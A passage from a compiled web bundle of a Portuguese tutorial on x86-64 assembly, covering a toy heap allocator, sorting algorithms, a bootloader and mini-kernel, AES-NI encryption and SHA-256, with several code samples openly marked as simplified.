    ; Retornar ponteiro para dados:
    lea rax, [rbx + HEADER_SIZE]
    jmp .fim

.proximo:
    ; Avançar para o próximo bloco:
    add rbx, HEADER_SIZE
    add rbx, [rbx - HEADER_SIZE] ; rbx += tamanho do bloco atual
    jmp .search

.nao_encontrou:
    ; Expandir o heap:
    lea rdi, [r12 + HEADER_SIZE]
    call expand_heap
    
    cmp rax, -1
    je  .falhou
    
    ; rax = antigo heap_end = início do novo bloco:
    ; (antes da expansão, heap_end era o antigo fim = novo bloco)
    ; Precisamos do endereço antes da expansão:
    mov rax, [heap_end]
    sub rax, r12
    sub rax, HEADER_SIZE         ; rax = endereço do novo bloco
    
    ; Escrever header:
    mov [rax], r12               ; size
    mov qword [rax + 8], 0       ; flags = alocado
    
    lea rax, [rax + HEADER_SIZE]
    jmp .fim

.falhou:
    xor rax, rax                 ; return NULL
    
.fim:
    pop r12
    pop rbx
    ret

; my_free(void *ptr)
; Entrada: rdi = ponteiro para dados (retornado pelo malloc)
my_free:
    test rdi, rdi
    jz  .fim                     ; free(NULL) é no-op
    
    ; Recuar para o header:
    sub rdi, HEADER_SIZE
    
    ; Marcar como livre:
    or qword [rdi + 8], FLAG_FREE
    
.fim:
    ret`}),r.jsx(T,{type:"info",title:"Melhorias Possíveis",children:"Este é um alocador mínimo para fins educacionais. Um malloc real inclui: coalescing (juntar blocos livres adjacentes), splitting (dividir blocos grandes), múltiplas estratégias (best-fit, buddy system), arenas por thread (thread-safety), e mmap para blocos grandes."}),r.jsx("h2",{children:"Testando o Alocador"}),r.jsx(d,{language:"c",filename:"test_malloc.c",code:`// Testar o alocador Assembly:
extern void* my_malloc(size_t size);
extern void  my_free(void *ptr);

int main() {
    // Alocar arrays:
    int *arr1 = my_malloc(10 * sizeof(int));
    int *arr2 = my_malloc(20 * sizeof(int));
    
    // Usar:
    for (int i = 0; i < 10; i++) arr1[i] = i;
    for (int i = 0; i < 20; i++) arr2[i] = i * 2;
    
    // Liberar:
    my_free(arr1);
    my_free(arr2);
    
    // Re-alocar (deve reusar blocos livres):
    int *arr3 = my_malloc(8 * sizeof(int));  // pode pegar arr1 ou arr2
    my_free(arr3);
    
    return 0;
}`})]})}function k1(){return r.jsxs(L,{title:"Projeto: Algoritmos de Ordenação",subtitle:"Bubble Sort, Merge Sort e Quicksort em Assembly puro",difficulty:"avancado",timeToRead:"20 min",children:[r.jsx("p",{children:"Implementar algoritmos de ordenação em Assembly reforça o entendimento de ponteiros, recursão, e gerenciamento de stack. Comparando as implementações, você vê diretamente o custo de cada operação."}),r.jsx("h2",{children:"Bubble Sort"}),r.jsx(d,{language:"nasm",filename:"bubble_sort.asm",code:`; bubble_sort(long *arr, long n)
; Ordena array de long em ordem crescente
; Entrada: rdi = arr, rsi = n

section .text
    global bubble_sort

bubble_sort:
    push rbp
    mov  rbp, rsp
    push rbx
    push r12
    push r13

    dec rsi             ; rsi = n-1 (número de passes)
    jle .fim            ; n <= 1, já está ordenado

    mov r12, rsi        ; r12 = outer loop counter

.outer:
    test r12, r12
    jle .fim

    xor r13, r13        ; r13 = inner index

.inner:
    cmp r13, r12
    jge .outer_next

    ; Comparar arr[i] e arr[i+1]:
    mov rax, [rdi + r13*8]
    mov rbx, [rdi + r13*8 + 8]
    cmp rax, rbx
    jle .no_swap

    ; Trocar arr[i] e arr[i+1]:
    mov [rdi + r13*8], rbx
    mov [rdi + r13*8 + 8], rax

.no_swap:
    inc r13
    jmp .inner

.outer_next:
    dec r12
    jmp .outer

.fim:
    pop r13
    pop r12
    pop rbx
    leave
    ret`}),r.jsx("h2",{children:"Merge Sort"}),r.jsx(d,{language:"nasm",filename:"merge_sort.asm",code:`; merge_sort(long *arr, long n)
; Divide e conquista — O(n log n)
; Entrada: rdi = arr, rsi = n

merge_sort:
    push rbp
    mov  rbp, rsp
    push rbx
    push r12
    push r13
    push r14

    cmp rsi, 1
    jle .base_case      ; n <= 1, já ordenado

    mov r12, rdi        ; salvar arr
    mov r13, rsi        ; salvar n

    ; mid = n/2:
    mov r14, rsi
    shr r14, 1          ; r14 = n/2

    ; Ordenar metade esquerda: merge_sort(arr, mid)
    mov rdi, r12
    mov rsi, r14
    call merge_sort

    ; Ordenar metade direita: merge_sort(arr + mid, n - mid)
    lea rdi, [r12 + r14*8]
    mov rsi, r13
    sub rsi, r14
    call merge_sort

    ; Merge das duas metades:
    mov rdi, r12
    mov rsi, r13
    mov rdx, r14
    call merge

.base_case:
    pop r14
    pop r13
    pop r12
    pop rbx
    leave
    ret

; merge(arr, n, mid) — merge das duas metades
; rdi = arr, rsi = n, rdx = mid
merge:
    push rbx
    push r12
    push r13
    push r14
    push r15

    ; Alocar buffer temporário (usa a stack):
    mov r12, rsi
    shl r12, 3          ; r12 = n * 8 bytes
    sub rsp, r12        ; alocar na stack

    ; Copiar para buffer:
    mov rdi, rsp        ; destino = buffer
    ; rdi original = arr
    ; (simplificado — implementação completa omite detalhes)

    ; Merge dos dois sub-arrays:
    xor r13, r13        ; índice esquerdo = 0
    mov r14, rdx        ; índice direito = mid
    xor r15, r15        ; índice do resultado = 0

.merge_loop:
    cmp r13, rdx        ; esq chegou ao meio?
    jge .copiar_restante_dir
    cmp r14, rsi        ; dir chegou ao fim?
    jge .copiar_restante_esq

    ; Comparar elementos:
    ; (implementação completa aqui)

.copiar_restante_esq:
.copiar_restante_dir:

    add rsp, r12        ; liberar buffer
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    ret`}),r.jsx("h2",{children:"Quicksort"}),r.jsx(d,{language:"nasm",filename:"quicksort.asm",code:`; quicksort(long *arr, long lo, long hi)
; Entrada: rdi = arr, rsi = lo, rdx = hi

quicksort:
    push rbp
    mov  rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15

    cmp rsi, rdx
    jge .fim            ; lo >= hi → done

    mov rbx, rdi        ; rbx = arr
    mov r12, rsi        ; r12 = lo
    mov r13, rdx        ; r13 = hi

    ; Partição (Lomuto partition scheme):
    ; pivot = arr[hi]
    mov r14, [rbx + r13*8]  ; r14 = pivot
    mov r15, r12             ; r15 = i = lo

.partition_loop:
    mov rax, r12             ; j loop
.j_loop:
    cmp rax, r13
    jge .partition_done

    cmp [rbx + rax*8], r14  ; arr[j] <= pivot?
    jg  .j_next

    ; Trocar arr[i] e arr[j]:
    mov rcx, [rbx + r15*8]
    mov rdx, [rbx + rax*8]
    mov [rbx + r15*8], rdx
    mov [rbx + rax*8], rcx
    inc r15

.j_next:
    inc rax
    jmp .j_loop

.partition_done:
    ; Colocar pivot na posição correta:
    mov rcx, [rbx + r15*8]
    mov rdx, [rbx + r13*8]
    mov [rbx + r15*8], rdx
    mov [rbx + r13*8], rcx
    ; r15 = pivot index

    ; Recursão na metade esquerda:
    mov rdi, rbx
    mov rsi, r12
    lea rdx, [r15 - 1]
    call quicksort

    ; Recursão na metade direita:
    mov rdi, rbx
    lea rsi, [r15 + 1]
    mov rdx, r13
    call quicksort

.fim:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    leave
    ret`})]})}function F1(){return r.jsxs(L,{title:"Projeto: Bootloader",subtitle:"Escrevendo um bootloader do zero que inicia em modo protegido",difficulty:"expert",timeToRead:"30 min",children:[r.jsx("p",{children:"Um bootloader é o primeiro código que roda quando o computador liga. O BIOS carrega 512 bytes (MBR) do disco para 0x7C00 e pula para lá. Nosso bootloader vai fazer a transição para modo protegido 32-bit."}),r.jsxs(T,{type:"info",title:"Requisitos",children:["Você precisará de QEMU para testar: ",r.jsx("code",{children:"sudo apt install qemu-system-x86"}),". Nunca teste em hardware real sem saber exatamente o que está fazendo — pode danificar o MBR do disco."]}),r.jsx("h2",{children:"Estrutura do Bootloader"}),r.jsx(d,{language:"bash",code:`bootloader/
├── boot.asm        — MBR/Stage 1 (512 bytes)
├── stage2.asm      — Stage 2 (carregado pelo boot.asm)
└── Makefile

# Compilar e testar:
nasm -f bin boot.asm -o boot.bin
# Verificar que tem exatamente 512 bytes:
wc -c boot.bin   # deve ser 512

# Testar no QEMU:
qemu-system-i386 -drive format=raw,file=boot.bin -nographic`}),r.jsx("h2",{children:"Boot Stage 1 — O MBR"}),r.jsx(d,{language:"nasm",filename:"boot.asm",code:`; boot.asm — MBR bootloader (512 bytes)
; Carregado pelo BIOS em 0x7C00
; Objetivo: Configurar stack, carregar Stage 2, ir para modo protegido

bits 16
org 0x7C00

STAGE2_SEGMENT equ 0x0000
STAGE2_OFFSET  equ 0x8000   ; Stage 2 carregado em 0x8000

start:
    ; Desabilitar interrupções
    cli

    ; Configurar segmentos
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00      ; stack cresce abaixo do nosso código

    ; Salvar número do drive de boot (BIOS passa em DL)
    mov [boot_drive], dl

    ; Exibir mensagem
    mov si, msg_boot
    call print_string

    ; Carregar Stage 2 do disco:
    ; INT 13h, AH=02: Ler setor
    mov ah, 0x02        ; função: ler
    mov al, 16          ; ler 16 setores (8KB)
    mov ch, 0           ; trilha 0
    mov cl, 2           ; setor 2 (o 1 é nós mesmos)
    mov dh, 0           ; cabeça 0
    mov dl, [boot_drive]
    mov bx, STAGE2_OFFSET  ; ES:BX = destino
    int 0x13
    jc  disk_error      ; CF=1 se falhou

    mov si, msg_ok
    call print_string

    ; Carregar GDT:
    lgdt [gdt_descriptor]

    ; Habilitar modo protegido:
    mov eax, cr0
    or  eax, 1
    mov cr0, eax

    ; Far jump para Stage 2 (em código 32-bit):
    jmp 0x08:STAGE2_OFFSET  ; 0x08 = code segment da GDT

; === Subrotinas 16-bit ===
print_string:
    .loop:
        lodsb
        test al, al
        jz .done
        mov ah, 0x0E
        int 0x10
        jmp .loop
    .done:
        ret

disk_error:
    mov si, msg_err
    call print_string
    hlt

; === Dados ===
msg_boot db "Iniciando boot...", 13, 10, 0
msg_ok   db "Stage 2 carregado!", 13, 10, 0
msg_err  db "ERRO: falha ao ler disco!", 13, 10, 0
boot_drive db 0

; === GDT ===
gdt_start:
    ; Null descriptor:
    dq 0

    ; Code segment (Ring 0, 32-bit):
    dw 0xFFFF, 0x0000
    db 0x00, 0x9A, 0xCF, 0x00

    ; Data segment (Ring 0, 32-bit):
    dw 0xFFFF, 0x0000
    db 0x00, 0x92, 0xCF, 0x00
gdt_end:

gdt_descriptor:
    dw gdt_end - gdt_start - 1
    dd gdt_start

; === Assinatura de boot ===
times 510 - ($ - $$) db 0
dw 0xAA55`}),r.jsx("h2",{children:"Stage 2 — Kernel Mínimo 32-bit"}),r.jsx(d,{language:"nasm",filename:"stage2.asm",code:`; stage2.asm — continuação do boot em modo protegido 32-bit
bits 32
org 0x8000

SCREEN_BASE equ 0xB8000  ; VGA text mode buffer

stage2_main:
    ; Configurar segmentos de dados:
    mov ax, 0x10        ; data segment
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax
    mov esp, 0x90000    ; nova stack em 512KB

    ; Limpar tela:
    call clear_screen

    ; Imprimir mensagem:
    mov esi, msg_pm
    mov edi, SCREEN_BASE
    mov ecx, 0x0A       ; attribute: bright green on black
    call print_pm

    ; Loop infinito:
.halt:
    hlt
    jmp .halt

; Limpar tela VGA:
clear_screen:
    mov edi, SCREEN_BASE
    mov eax, 0x07200720  ; espaço com atributo branco
    mov ecx, 80*25/2     ; 80×25 / 2 dwords
    rep stosd
    ret

; Imprimir string em modo texto VGA:
; ESI = string, EDI = destino VGA, ECX = atributo
print_pm:
.loop:
    movzx eax, byte [esi]
    test eax, eax
    jz  .done
    mov ah, cl           ; atributo
    mov [edi], ax        ; char + atributo
    inc esi
    add edi, 2           ; cada célula VGA = 2 bytes (char + attr)
    jmp .loop
.done:
    ret

msg_pm db "Modo Protegido 32-bit ativo! Bem-vindo ao seu OS.", 0`}),r.jsx(d,{language:"makefile",filename:"Makefile",code:`# Makefile para o bootloader
NASM = nasm

all: boot.img

boot.bin: boot.asm
	$(NASM) -f bin $< -o $@

stage2.bin: stage2.asm
	$(NASM) -f bin $< -o $@

boot.img: boot.bin stage2.bin
	# Concatenar stage1 (512 bytes) com stage2
	cat boot.bin stage2.bin > boot.img
	# Preencher para 1MB (imagem completa)
	truncate -s 1M boot.img

run: boot.img
	qemu-system-i386 -drive format=raw,file=boot.img -nographic

clean:
	rm -f *.bin *.img`})]})}function G1(){return r.jsxs(L,{title:"Projeto: Kernel Mínimo",subtitle:"Do bootloader a um mini-kernel 64-bit com IDT e teclado",difficulty:"expert",timeToRead:"35 min",children:[r.jsx("p",{children:"Após o bootloader, podemos expandir para um kernel mínimo que inicializa a IDT (tabela de interrupções) e responde a teclas do teclado — o coração de um sistema operacional."}),r.jsx(T,{type:"info",title:"Projeto Avançado",children:"Este projeto requer conhecimento de GDT, IDT, paginação e modo protegido. Recomende completar os capítulos Modo Real, Modo Protegido e Long Mode antes de continuar."}),r.jsx("h2",{children:"Estrutura do Projeto"}),r.jsx(d,{language:"bash",code:`minikernel/
├── boot/
│   ├── boot.asm        — MBR + switch para long mode
│   └── gdt.asm         — GDT de 64-bit
├── kernel/
│   ├── kmain.c         — ponto de entrada C
│   ├── idt.asm         — IDT e handlers
│   ├── idt.c           — configuração da IDT
│   ├── keyboard.c      — driver de teclado
│   └── vga.c           — driver VGA texto
├── linker.ld           — script do linker
└── Makefile`}),r.jsx("h2",{children:"IDT — Interrupt Descriptor Table"}),r.jsx(d,{language:"nasm",filename:"idt.asm",code:`; IDT handlers em Assembly
; O hardware salva: SS, RSP, RFLAGS, CS, RIP automaticamente
; Nós precisamos salvar os outros registradores

bits 64

section .text
    global isr_handler_asm
    global irq_handler_asm
    extern isr_handler_c
    extern irq_handler_c

; Macro para criar stubs de ISR (sem error code):
%macro ISR_NOERRCODE 1
global isr%1
isr%1:
    push 0              ; error code falso
    push %1             ; número do interrupt
    jmp isr_common_stub
%endmacro

; Macro para ISR com error code (automático):
%macro ISR_ERRCODE 1
global isr%1
isr%1:
    push %1             ; número do interrupt (error code já está na stack)
    jmp isr_common_stub
%endmacro

; Macro para IRQ:
%macro IRQ 2
global irq%1
irq%1:
    push 0
    push %2
    jmp irq_common_stub
%endmacro

; Exceções padrão:
ISR_NOERRCODE 0    ; Division by zero
ISR_NOERRCODE 1    ; Debug
ISR_NOERRCODE 2    ; NMI
ISR_NOERRCODE 3    ; Breakpoint
ISR_NOERRCODE 4    ; Overflow
ISR_NOERRCODE 5    ; Bound range exceeded
ISR_NOERRCODE 6    ; Invalid opcode
ISR_NOERRCODE 7    ; FPU not available
ISR_ERRCODE   8    ; Double fault
ISR_NOERRCODE 9    ; Coprocessor segment overrun
ISR_ERRCODE   10   ; Invalid TSS
ISR_ERRCODE   11   ; Segment not present
ISR_ERRCODE   12   ; Stack segment fault
ISR_ERRCODE   13   ; General protection fault
ISR_ERRCODE   14   ; Page fault

; IRQs:
IRQ 0, 32   ; Timer
IRQ 1, 33   ; Keyboard
IRQ 2, 34   ; Cascade
; ... etc

; Stub comum para todos os ISR:
isr_common_stub:
    ; Salvar todos os registradores:
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    ; Chamar handler em C:
    mov rdi, rsp        ; rdi = ponteiro para struct com todos os registradores
    call isr_handler_c

    ; Restaurar registradores:
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax

    add rsp, 16         ; remover error code e número do interrupt
    iretq               ; retornar da interrupção

irq_common_stub:
    ; Similar ao isr_common_stub...`}),r.jsx("h2",{children:"Driver de Teclado"}),r.jsx(d,{language:"c",filename:"keyboard.c",code:`// Driver de teclado PS/2 mínimo
#include <stdint.h>

#define KEYBOARD_DATA_PORT   0x60
#define KEYBOARD_STATUS_PORT 0x64

// Ler um byte do teclado:
static inline uint8_t inb(uint16_t port) {
    uint8_t val;
    asm volatile ("inb %1, %0" : "=a"(val) : "Nd"(port));
    return val;
}

// Tabela de scancodes (Set 1):
static const char scancode_table[] = {
    0, 0x1B, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
    '-', '=', '\\b', '\\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',
    'o', 'p', '[', ']', '\\n', 0, 'a', 's', 'd', 'f', 'g', 'h',
    'j', 'k', 'l', ';', 39, 96, 0, '\\\\', 'z', 'x', 'c', 'v',
    'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' ',
};

void keyboard_handler(uint8_t scancode) {
    // Bit 7 = tecla solta, bit 0-6 = scancode
    if (scancode & 0x80) return;  // key release — ignorar

    if (scancode < sizeof(scancode_table)) {
        char c = scancode_table[scancode];
        if (c) {
            // Exibir o caractere:
            vga_putchar(c);
        }
    }
}

// Chamado pelo IRQ 1 handler:
void keyboard_irq_handler() {
    uint8_t scancode = inb(KEYBOARD_DATA_PORT);
    keyboard_handler(scancode);
    // Enviar EOI para o PIC:
    outb(0x20, 0x20);  // EOI para PIC master
}`})]})}function V1(){return r.jsxs(L,{title:"AES em Assembly",subtitle:"Implementando AES-128 usando instruções AES-NI do hardware",difficulty:"expert",timeToRead:"25 min",children:[r.jsx("p",{children:"Processadores Intel/AMD modernos têm instruções de hardware para AES (Advanced Encryption Standard) — as instruções AES-NI. São extremamente rápidas e resistentes a timing attacks."}),r.jsx("h2",{children:"Instruções AES-NI"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Instrução"}),r.jsx("th",{children:"Operação"}),r.jsx("th",{children:"Ciclos"})]})}),r.jsx("tbody",{children:[["AESENC xmm, xmm","Uma rodada de encriptação AES","~7"],["AESENCLAST xmm, xmm","Última rodada de encriptação","~7"],["AESDEC xmm, xmm","Uma rodada de decriptação AES","~7"],["AESDECLAST xmm, xmm","Última rodada de decriptação","~7"],["AESKEYGENASSIST xmm, xmm, imm8","Geração de subchave","~10"],["AESIMC xmm, xmm","Inverse Mix Columns (para decriptação)","~14"]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:l}),r.jsx("td",{children:u})]},i))})]}),r.jsx("h2",{children:"Verificar Suporte a AES-NI"}),r.jsx(d,{language:"nasm",filename:"check_aesni.asm",code:`; Verificar se CPU suporta AES-NI:
check_aesni:
    mov eax, 1
    cpuid
    bt ecx, 25          ; bit 25 do ECX = AES-NI
    jnc .no_support
    ; CPU suporta AES-NI!
    ret
.no_support:
    ; Fallback para implementação software
    ret`}),r.jsx("h2",{children:"Geração de Round Keys — Key Schedule"}),r.jsx(d,{language:"nasm",filename:"key_schedule.asm",code:`; AES-128 usa 10 rodadas + 1 chave inicial = 11 round keys de 128-bit
; Entrada: rdi = chave de 128-bit (16 bytes)
; Saída: rsi = array de 11 × 128-bit round keys (176 bytes)

section .text
    global aes128_key_schedule

aes128_key_schedule:
    movdqu xmm1, [rdi]          ; xmm1 = chave original
    movdqu [rsi], xmm1          ; round_key[0] = chave

    ; Gerar round keys 1-10:
    ; Key expansion usando AESKEYGENASSIST:

    %macro KEY_EXP 2            ; %1 = rcon value, %2 = offset no array de saída
        aeskeygenassist xmm2, xmm1, %1   ; xmm2 = chave parcial
        ; Palavra de controle: usar o ultimo dword (shufps)
        pshufd xmm2, xmm2, 0xFF         ; broadcast ultimo dword
        ; XOR com deslocamentos da chave anterior:
        movdqa xmm3, xmm1
        pslldq xmm3, 4                   ; shift esquerda 4 bytes
        pxor xmm1, xmm3
        pslldq xmm3, 4
        pxor xmm1, xmm3
        pslldq xmm3, 4
        pxor xmm1, xmm3
        pxor xmm1, xmm2                  ; xmm1 = nova round key
        movdqu [rsi + %2], xmm1
    %endmacro

    KEY_EXP 0x01, 16
    KEY_EXP 0x02, 32
    KEY_EXP 0x04, 48
    KEY_EXP 0x08, 64
    KEY_EXP 0x10, 80
    KEY_EXP 0x20, 96
    KEY_EXP 0x40, 112
    KEY_EXP 0x80, 128
    KEY_EXP 0x1B, 144
    KEY_EXP 0x36, 160

    ret`}),r.jsx("h2",{children:"AES-128 ECB Encrypt"}),r.jsx(d,{language:"nasm",filename:"aes_encrypt.asm",code:`; aes128_encrypt_block(plaintext, round_keys) → ciphertext
; Entrada: rdi = ponteiro para 16 bytes plaintext
;          rsi = ponteiro para 11 × 16 bytes round keys
; Saída: resultado em xmm0 (caller deve salvar)

aes128_encrypt_block:
    movdqu xmm0, [rdi]          ; xmm0 = plaintext

    ; Operação inicial: AddRoundKey com round_key[0]
    pxor xmm0, [rsi]

    ; Rodadas 1-9 (usando AESENC):
    aesenc xmm0, [rsi + 16]
    aesenc xmm0, [rsi + 32]
    aesenc xmm0, [rsi + 48]
    aesenc xmm0, [rsi + 64]
    aesenc xmm0, [rsi + 80]
    aesenc xmm0, [rsi + 96]
    aesenc xmm0, [rsi + 112]
    aesenc xmm0, [rsi + 128]
    aesenc xmm0, [rsi + 144]

    ; Rodada final 10 (usando AESENCLAST):
    aesenclast xmm0, [rsi + 160]

    ; xmm0 = ciphertext
    ret`}),r.jsx("h2",{children:"AES-128 CTR Mode (Paralelo)"}),r.jsx(d,{language:"nasm",filename:"aes_ctr.asm",code:`; AES-CTR: encripta múltiplos blocos em paralelo!
; CTR: ciphertext[i] = plaintext[i] XOR AES(key, nonce || counter[i])
; Como cada bloco é independente, podemos encriptar múltiplos de uma vez:

aes128_ctr_encrypt_4blocks:
    ; Preparar 4 contadores (incrementando):
    movdqu xmm0, [rdi]          ; contador base
    movdqa xmm1, xmm0
    movdqa xmm2, xmm0
    movdqa xmm3, xmm0

    ; Incrementar contadores:
    paddd xmm1, [ctr_inc_1]    ; xmm1 = counter + 1
    paddd xmm2, [ctr_inc_2]    ; xmm2 = counter + 2
    paddd xmm3, [ctr_inc_3]    ; xmm3 = counter + 3

    ; AddRoundKey inicial para todos os 4 blocos de uma vez:
    pxor xmm0, [rsi]
    pxor xmm1, [rsi]
    pxor xmm2, [rsi]
    pxor xmm3, [rsi]

    ; 9 rodadas para os 4 blocos:
    %macro AES_ROUND_4 1
        aesenc xmm0, [rsi + %1]
        aesenc xmm1, [rsi + %1]
        aesenc xmm2, [rsi + %1]
        aesenc xmm3, [rsi + %1]
    %endmacro

    AES_ROUND_4 16
    AES_ROUND_4 32
    ; ... (repetir para todas as 9 rodadas) ...
    AES_ROUND_4 144

    ; Rodada final:
    aesenclast xmm0, [rsi + 160]
    aesenclast xmm1, [rsi + 160]
    aesenclast xmm2, [rsi + 160]
    aesenclast xmm3, [rsi + 160]

    ; XOR com plaintext para obter ciphertext:
    pxor xmm0, [rdx]        ; plaintext block 0
    pxor xmm1, [rdx + 16]   ; plaintext block 1
    pxor xmm2, [rdx + 32]   ; plaintext block 2
    pxor xmm3, [rdx + 48]   ; plaintext block 3

    ; Salvar ciphertext:
    movdqu [rcx],      xmm0
    movdqu [rcx + 16], xmm1
    movdqu [rcx + 32], xmm2
    movdqu [rcx + 48], xmm3
    ret`}),r.jsx(T,{type:"success",title:"Performance do AES-NI",children:"Uma implementação AES-NI bem otimizada pode atingir mais de 10 GB/s em um único core moderno. Isso é ~10× mais rápido que uma implementação software em C. O processador faz cada rodada AES em ~7 ciclos, e com pipelining e paralelismo de blocos CTR, pode processar múltiplos blocos simultaneamente."})]})}function H1(){return r.jsxs(L,{title:"SHA-256 em Assembly",subtitle:"Implementando SHA-256 com extensões SHA de hardware",difficulty:"expert",timeToRead:"20 min",children:[r.jsx("p",{children:"Assim como AES-NI para criptografia, processadores modernos (Intel Goldmont+, AMD Zen+) têm instruções de hardware para SHA-256 — as extensões SHA. Isso acelera hashing em 3-4× comparado à implementação software."}),r.jsx("h2",{children:"Instruções SHA"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Instrução"}),r.jsx("th",{children:"Operação"})]})}),r.jsx("tbody",{children:[["SHA256MSG1 xmm, xmm","Prepara mensagem (sigma0 + expansão parcial)"],["SHA256MSG2 xmm, xmm","Completa expansão da mensagem"],["SHA256RNDS2 xmm, xmm","Executa 2 rodadas de SHA-256"]].map(([i,l])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:l})]},i))})]}),r.jsx("h2",{children:"SHA-256 — Constantes e Algoritmo"}),r.jsx(d,{language:"nasm",filename:"sha256_const.asm",code:`; As 64 constantes K de SHA-256 (primeiros 32 bits das raízes cúbicas dos primos):
section .rodata
    align 64
sha256_constants:
    dd 0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5
    dd 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5
    dd 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3
    dd 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174
    dd 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc
    dd 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da
    dd 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7
    dd 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967
    dd 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13
    dd 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85
    dd 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3
    dd 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070
    dd 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5
    dd 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3
    dd 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208
    dd 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2

; Estado inicial (primeiros 32 bits das raízes quadradas dos 8 primeiros primos):
sha256_init_state:
    dd 0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a
    dd 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19`}),r.jsx("h2",{children:"SHA-256 Software (Portável)"}),r.jsx(d,{language:"nasm",filename:"sha256_sw.asm",code:`; SHA-256 rodada em software (sem extensões de hardware)
; rdi = estado [h0,h1,h2,h3,h4,h5,h6,h7]
; rsi = bloco de mensagem (64 bytes)

; Operações de SHA-256:
; Ch(x,y,z) = (x & y) ^ (~x & z)
; Maj(x,y,z) = (x & y) ^ (x & z) ^ (y & z)
; Σ0(x) = ROR(x,2) ^ ROR(x,13) ^ ROR(x,22)
; Σ1(x) = ROR(x,6) ^ ROR(x,11) ^ ROR(x,25)
; σ0(x) = ROR(x,7) ^ ROR(x,18) ^ SHR(x,3)
; σ1(x) = ROR(x,17) ^ ROR(x,19) ^ SHR(x,10)

; Macros para as operações SHA:
%macro SHA_CH 4         ; dest = Ch(x,y,z): %1=dest, %2=x, %3=y, %4=z
    mov %1, %2
    and %1, %3
    mov rcx, %2
    not rcx
    and rcx, %4
    xor %1, rcx
%endmacro

%macro SHA_SIGMA1 2     ; %1 = Σ1(%2)
    mov %1, %2
    ror %1, 6
    mov rcx, %2
    ror rcx, 11
    xor %1, rcx
    mov rcx, %2
    ror rcx, 25
    xor %1, rcx
%endmacro

section .text
sha256_process_block:
    push rbp
    mov  rbp, rsp
    sub  rsp, 256       ; W[64] = 64 dwords × 4 bytes = 256 bytes

    ; 1. Preparar message schedule W[0..63]:
    ; W[0..15] = bloco de mensagem (big-endian!):
    mov rcx, 16
    xor r8, r8
.copy_msg:
    mov eax, [rsi + r8*4]
    bswap eax           ; big-endian → little-endian
    mov [rsp + r8*4], eax
    inc r8
    dec rcx
    jnz .copy_msg

    ; W[16..63] = expansão:
    mov rcx, 48         ; 64 - 16 = 48 iterações
    mov r8, 16
.expand:
    ; W[i] = σ1(W[i-2]) + W[i-7] + σ0(W[i-15]) + W[i-16]
    ; (implementação completa aqui)
    inc r8
    dec rcx
    jnz .expand

    ; 2. Inicializar variáveis de trabalho a..h com estado atual

    ; 3. 64 rodadas de compressão

    ; 4. Adicionar ao estado
    leave
    ret`}),r.jsxs(T,{type:"info",title:"SHA com Hardware",children:["Com as extensões SHA (disponíveis em Intel Ice Lake+, AMD Zen+), ",r.jsx("code",{children:"SHA256RNDS2"})," faz 2 rodadas de SHA-256 em ~3-4 ciclos cada. Uma implementação completa com SHA-NI pode processar ~2 GB/s em um core."]})]})}function Z1(){return r.jsxs(L,{title:"Referências e Recursos",subtitle:"Documentação oficial, livros, ferramentas e comunidades para continuar aprendendo",difficulty:"iniciante",timeToRead:"5 min",children:[r.jsx("p",{children:"Assembly é uma jornada de aprendizado contínuo. Aqui estão os melhores recursos para aprofundar seu conhecimento."}),r.jsx("h2",{children:"Documentação Oficial"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Intel Software Developer's Manual"})," — A referência definitiva do x86-64",r.jsx("br",{}),r.jsx("small",{children:"developer.intel.com/articles/intel-sdm — 5000+ páginas de detalhe técnico"})]}),r.jsxs("li",{children:[r.jsx("strong",{children:"AMD64 Architecture Programmer's Manual"}),r.jsx("br",{}),r.jsx("small",{children:"developer.amd.com — perspectiva AMD, bom para extensões como AVX"})]}),r.jsxs("li",{children:[r.jsx("strong",{children:"System V ABI for x86-64"}),r.jsx("br",{}),r.jsx("small",{children:"Documentação da calling convention Linux: gitlab.com/x86-psABIs/x86-64-ABI"})]}),r.jsxs("li",{children:[r.jsx("strong",{children:"NASM Manual"}),r.jsx("br",{}),r.jsx("small",{children:"nasm.us/doc — referência completa do NASM"})]}),r.jsxs("li",{children:[r.jsx("strong",{children:"ARM Architecture Reference Manual 